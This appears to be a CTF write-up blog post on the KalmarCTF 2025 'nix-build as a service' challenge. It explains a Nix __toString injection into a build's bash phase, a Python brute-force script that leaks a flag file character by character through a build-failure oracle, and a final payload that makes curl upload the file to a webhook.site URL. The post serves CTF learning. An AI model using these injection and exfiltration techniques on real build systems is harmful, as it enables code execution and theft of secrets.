+++
title = 'KalmarCTF 2025: nix-build as a service (Misc)'
date = 2025-03-10T10:00:00+01:00
draft = false
+++

nix-build as a service was a misc challenge with 6 solves at KalmarCTF 2025 with the following description:

> Reproducible pwning is back! This time we learned our lesson and instead of full SSH access you can only request building a derivation.
> Surely you won't be able to leak anything this time?

The [author](https://hachyderm.io/@nrab) had already written a similar Nix-based challenge[^1] at KalmarCTF 2024, which I missed unfortunately.
Knowing this -- and reading the challenge's description -- I expected the challenge to be a (harder?) sequel for the previous one. So me and the fellow Nixers at FluxFingers[^2] sat down to solve this.

The challenge setup includes a QEMU VM that exposes a Rust web service that uses some input of us to build a Nix derivation with.

The relevant bits of the web server are this:

```rust
let d = tempdir()?;
let workdir = d.path();

let chall_dir = state.chall_dir();

let files = get_file_previews(chall_dir).await?;

let chall_dir = tokio::fs::read_dir(state.chall_dir()).await?;
let chall_dir = ReadDirStream::new(chall_dir);

chall_dir
    .map_err(AppError::from)
    .try_filter(|f| {
        let name = f.file_name();
        future::ready(
            name == "flag.txt" || Path::new(&name).extension().is_some_and(|ext| ext == "nix"),
        )
    })
    .try_for_each_concurrent(None, |entry| async move {
        let old_path = entry.path();
        let new_path = workdir.join(entry.file_name());
        tokio::fs::copy(old_path, new_path).await?;
        Ok(())
    })
    .await?;

let user_input = input.user_input.replace("\r\n", "\n");
tokio::fs::write(workdir.join("user-input.nix"), &user_input).await?;

let output = Command::new("nix-build")
    .arg(workdir)
    .stdin(Stdio::null())
    .stdout(Stdio::piped())
    .stderr(Stdio::piped())
    .spawn()?
    .wait_with_output()
    .await?;

let log = if output.stdout.is_empty() {
    output.stderr
} else {
    output.stdout
};
let log = String::from_utf8_lossy(&log);
let last_line = log
    .lines()
    .last()
    .map(|s| s.to_string())
    .unwrap_or_default();
```

So the server does the following:

- Create a tempdir for our build.
- Copy all `.nix` files and `flag.txt` to that tempdir.
- Write the `user-input.nix` we provide through the web interface to the directory.
- Execute `nix-build` in that directory, which will (as no specific file argument is given) build the `default.nix` in that directory.
- Return the last line of logs from stderr or stdout to be bubbled back by the web server, with stdout taking precedence over stderr.

The `default.nix` that's built looks as follows:

```nix
let
  nixpkgs = builtins.fetchTarball {
    url = "https://github.com/NixOS/nixpkgs/archive/8532db2a88ba56de9188af72134d93e39fd825f3.tar.gz";
    sha256 = "sha256-tttEXgKimgbtPvxFl+Avos4P4lssIqxHhxpLbbvNekk=";
  };
  pkgs = import nixpkgs { };
  inherit (pkgs) lib;
  no-builtins = import ./no-builtins.nix;
  user-input = builtins.scopedImport no-builtins ./user-input.nix;
  # TODO: Make sure the user does not reference the flag
  user-drv = assert lib.isDerivation user-input; pkgs.hello // user-input;
in
pkgs.stdenvNoCC.mkDerivation {
  pname = "nixjail";
  version = "0.0.1";

  dontUnpack = true;

  # FIXME: The user should not be able to execute arbitrary code
  # Ref: https://github.com/NixOS/nixpkgs/blob/master/pkgs/stdenv/generic/make-derivation.nix
  nativeBuildInputs = [user-drv];
  buildPhase = ''
    runHook preBuild
    # TODO: Enable building
    # "${user-drv}/bin/build"
    runHook postBuild
  '';

  installPhase = ''
    mkdir -p "$out"
    echo kalmarctf{not-this-flag} > "$out/flag"
  '';
}
```

What this does is:

- Use nixpkgs from a fixed, but non-modified upstream commit[^3]. So no tampered-with nixpkgs. :(
- Import the `user-input.nix`, the content of which we control, but prohibit access to all builtins and primops. (Yes, *everything*, really)
- Assert that the `user-input` we specified is a derivation (more on what that means later) and update `pkgs.hello`'s package attribute set with our input.
- Include the resulting package attribute set in the `nativeBuildInputs` and in the `buildPhase` of the "jail" derivation.

So for us, this means we have to specify some `user-input` that passes the checks and leaks the *correct* flag from the build.
The one inlined in the `installPhase` is just bait though -- the correct one is in the `flag.txt` file that gets copied to the build directory.

## Solving the Challenge

As every CTF player would do, we started by blindly throwing some payloads at the target.

Since we only get the last log line on the web interface, which doesn't really play well with Nix' error formatting, we had to
resort to building some logging into the challenge for testing purposes.

Adding this line to the Rust app was sufficient for our needs;

```rust
println!("{}", log);
```

With that in hand, we could see that a simple payload like `{}` (an empty attribute set) would get stuck at the `isDerivation` check:

```console
error: assertion '((lib).isDerivation user-input)' failed
at /home/msanft/dev/ctf/kalmar25/nix-build-aas/test/test.nix:9:5:
    8 |   user-drv =
    9 |     assert lib.isDerivation user-input;
      |     ^
    10|     pkgs.hello // user-input;
```

So that's a first hurdle we need to overcome.

### Passing the isDerivation check

As the nixpkgs `lib` (its standard library, essentially) is wholly implemented in Nix, we can easily browse its sources in nixpkgs.
A good entrypoint to this is Noogle[^4], which allows us to search the `lib` efficiently.

Looking at the source of `isDerivation`, we can see that it's fairly simple:

```nix
isDerivation =
    value: value.type or null == "derivation";
```

This check just verifies that the attribute set has a `type` attribute set to `"derivation"`. When the attribute doesn't exist, or when it's set to something other than `"derivation"`, it will return `false`.

Knowing that, we can adjust our payload to:

```nix
{
    type = "derivation";
}
```

Which is sufficient to get the build of the outer `nixjail` derivation working!

Now, the question is how to leak the flag.

### Getting Execution

Checking for the sinks in the code where our `user-input` ends up, it becomes apparent that there are two main entrypoints:

- `nativeBuildInputs`, where the `user-drv` derivation is included.
- `buildPhase`, where `user-drv` is interpolated to as a string.

> [!NOTE]
> Unfortunately, there have been some problems with the handout for the challenge initially, and the second sink was missing in the challenge code.
> This was promptly addressed by the author. However, the challenge was also exploitable without it.
> If you want to give that a chance, you should mark Hack.lu CTF 2025 in your calendars. ;)

Knowing how string interpolation works in Nix, the latter of the sinks is the more intersting one.

If you interpolate a string into another string in Nix like so:

```nix
let a = "foo"; in
"${a} bar"
```

You'll get `foo bar`. Seems familiar until here.
But how are more complex types (like an attribute set) handled?

```nix
let a = { }; in
"${a} bar"
```

Turns out they aren't! Evaluating this gives us:

```console
error:
    … while evaluating a path segment
        at «string»:1:2:
        1| "${a} bar"
         |  ^

    error: cannot coerce a set to a string: { }
```

Now comes the part where being familiar with Nix has been of great value. The Nix reference manual has a section on string interpolation[^5], which reads as follows:

> An attribute set interpolates to the return value of the function in the `__toString` applied to the attribute set itself.
> ```nix
> let
>  a = {
>    value = 1;
>    __toString = self: toString (self.value + 1);
>  };
> in
> "${a}"
> ```

That's great! We can define a function that will be called when interpolating `user-drv` into the `buildPhase` of the package.
As a bonus, we even get a reference to ourselves (`self`) passed as the argument.

For us, this means that we can inject arbitrary contents into the `buildPhase` of the `nixjail` derivation. As the `buildPhase`
just contains bash code here, this means that we can inject arbitrary commands. Let's test this with this payload:

```nix
{
  type = "derivation";
  __toString = self: "\"\ninjected here!\n#";
}
```

As we're injected in a bash string, this first closes the string, opens a new line, injects some contents, and then comments everything to the right of the injected line out in another new line.

Nix gives us the possibility to view the resulting build instructions of a package via `nix print-dev-env --file default.nix`.
Searching through that, we can indeed find our injected code:

```bash
# TODO: Enable building
# ""
injected here!
#/bin/build"
```

This is great, as it gives us the means to execute arbitrary bash code already. However, this code is only executed in Nix' build sandbox[^6], which limits what we can do.
For example, we don't have network access, so we can't just open a reverse shell.
Also, we don't even have access to `flag.txt` yet, as Nix will only give you access to the files that have explicitly been declared as inputs to the derivation in the build sandbox.

So, from this, two new problems arise:
- How do we get the `flag.txt` into the build?
- How do we leak the contents with no internet access?

### Getting Access to flag.txt

Again, string interpolation comes to the rescue!

When evaluating an expression, Nix has unsandboxed access to the local files[^7]. And when interpolating a path literal into a string, that path will be copied to the `/nix/store` directory, returning that path. Citing from the documentation again:

> ```console
> $ mkdir foo
> ```
>
> Reference the empty directory in an interpolated expression:
>
> ```nix
> "${./foo}"
> ```
>
> "/nix/store/2hhl2nz5v0khbn06ys82nrk99aa1xxdw-foo"

This means that we can interpolate the flag file into the build instructions with something like this:

```nix
{
  type = "derivation";
  __toString = self: "\"\nflag here: ${./flag.txt}\n#";
}
```

Which results in:

```bash
# TODO: Enable building
# ""
flag here: /nix/store/rr75zp6bg7dh72bmwlnfaax10lh8kvp5-flag.txt
#/bin/build"
```

Now, Nix also knows that it has to make this file available in the build sandbox for `nixjail`, as it is part of the recursive dependency closure of the build.
How this works exactly goes beyond the scope of this writeup, but there's further information on it on the internet[^8].

So, now that we have access to the flag file within the build, how do we exfiltrate it?

### Leaking the Flag

As the web interface will only ever provide us with the last log line, we didn't deem it very helpful during the CTF.

However, we'll also get information about whether the build fails or not! This is a great primitive for us, as we already have
arbitrary code execution within the build, and can thus *make it fail*.

Now, the idea is to make the build fail depending on the information in the flag file. The easiest way to do so is by repeatedly asking for a build, while guessing the flag character-by-character.

For this, we can use a payload like this:

```nix
{
  type = "derivation";
  __toString = self: "\"\nif [[ $(head -c LENGTH ${./flag.txt}) != \"KNOWN\" ]]; then exit 1; fi\n\#";
}
```

While replacing `KNOWN` with the characters we've already verified and `LENGTH` with the length of `KNOWN`, plus 1 for the new character we check in the iteration.

Combining this into a Python script can look like this:


```python
import requests
import string

URL = "https://f0d674bb1f83f8c87ba672ccf27a3e92.nix-build-as-a-service.chal-kalmarc.tf/"

TEMPLATE = '{\r\n  type = "derivation";\r\n  __toString = self: "\\"\\nif [[ $(head -c LENGTH ${./flag.txt}) != \\"KNOWN\\" ]]; then exit 1; fi\\n\\#";\r\n}'

known = "kalmar{"

alphabet = string.ascii_letters + string.digits + "_-!?}"

while True:
    for c in alphabet:
        print(f"Testing {known + c}")
        payload = TEMPLATE.replace('KNOWN', known + c).replace('LENGTH', str(len(known) + 1))
        r = requests.post(URL, data={"user_input": payload})
        if "For full logs" not in r.text: # error oracle
            known += c
            print(known)
            break
    else:
        print("No more characters found")
        break
```

Which leaves us with the flag:

> `kalmar{wow-no-way-reproducible-pwning-got-a-sequel}`

However, after talking to the author, we learned that a more elegant exfiltration approach was possible:

```nix
{
  type = "derivation";
  __toString = self: (self.src.overrideAttrs {
    outputHash = "";
    outputHashAlgo = "sha256";
    urls = [ "https://webhook.site/943284f3-a05a-46da-8308-6dd5fadfc0e1" ];
    curlOptsList = [ "-F" "flag=@${./flag.txt}" ];
  });
}
```

This makes use of `__toString` receiving `self`, which -- in our case -- is just a reference to `pkgs.hello`, after being merged with our `user-input` attribute set.

This way, we can get access to our own `src` attribute, which has an `overrideAttrs` function defined on it, allowing us to override the derivation, causing a rebuild.

You might wonder why we're able to use networking here. This is because of a concept called fixed-output derivations, which are how Nix can fetch stuff like package sources from the internet.
They work by specifiying in advance which hash you expect from its output. In this case, we don't specify a hash, which causes the build to fail, but it will still do the request initially, to show us what the hash of the received response look like.

This is enough to exfiltrate the flag by setting the options `curl` fetches the response with to include the flag file.

While both solves lead to the same result, in comparison, the intended one is much faster. (and also cooler!😎)

Kudos to the author for such a great challenge! This has been great fun to solve.

Thanks for reading!

[^1]: https://jade.fyi/blog/reproducible-pwning-writeup/, https://diogotc.com/blog/kalmarctf-writeup-reproducible-pwning/
[^2]: https://x.com/D_K_Dev
[^3]: https://github.com/NixOS/nixpkgs/commit/8532db2a88ba56de9188af72134d93e39fd825f3
[^4]: https://noogle.dev/
[^5]: https://github.com/NixOS/nix/blob/a047dec120672d00e069bacf10ffdda420fd1048/doc/manual/source/language/string-interpolation.md#interpolated-expression
[^6]: https://discourse.nixos.org/t/what-is-sandboxing-and-what-does-it-entail/15533
[^7]: This ignores some complexities like Flakes in conjuction with Git repositories, where Nix will have a limited view of what files are available.
[^8]: https://nixos.org/guides/nix-pills/20-basic-dependencies-and-hooks
